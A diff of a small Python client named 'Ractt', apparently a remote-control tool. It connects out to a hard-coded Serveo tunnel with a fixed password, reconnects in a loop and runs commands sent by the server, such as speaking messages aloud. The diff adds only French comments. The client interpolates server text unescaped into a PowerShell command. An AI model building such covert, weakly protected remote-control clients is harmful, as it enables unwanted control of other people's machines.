@@ -6,7 +6,8 @@ import time
 import platform
 
 # --- CONFIGURATION ---
-HOST = '103fa379dfd22edd-93-23-16-243.serveousercontent.com'  # URL Serveo ou IP locale
+# Remplace l'URL ci-dessous par l'adresse de ton serveur si nécessaire
+HOST = '103fa379dfd22edd-93-23-16-243.serveousercontent.com'
 PORT = 65432
 PASSWORD = "1234"
 RECONNECT_DELAY = 5
@@ -30,6 +31,7 @@ def execute_action(command):
                 subprocess.run(['powershell', '-Command',
                     f'(New-Object -ComObject SAPI.SpVoice).Speak("{msg}")'])
             else:
+                # Sur Bazzit/Linux, nécessite espeak-ng installé
                 subprocess.run(['espeak-ng', '-v', 'fr', msg])
             return "Message vocal envoyé"
 
@@ -61,7 +63,6 @@ def execute_action(command):
     except Exception as e:
         return f"Erreur : {str(e)}"
 
-
 def main():
     print(f"[*] Client Ractt ({platform.system()}) — connexion vers {HOST}:{PORT}")
     while True:
@@ -70,6 +71,7 @@ def main():
                 s.settimeout(10)
                 s.connect((HOST, PORT))
 
+                # Phase d'authentification
                 if s.recv(1024).decode() == "AUTH_REQUIRED":
                     s.sendall(PASSWORD.encode())
 
@@ -97,7 +99,5 @@ def main():
 
         time.sleep(RECONNECT_DELAY)
 
-
 if __name__ == "__main__":
     main()
-    
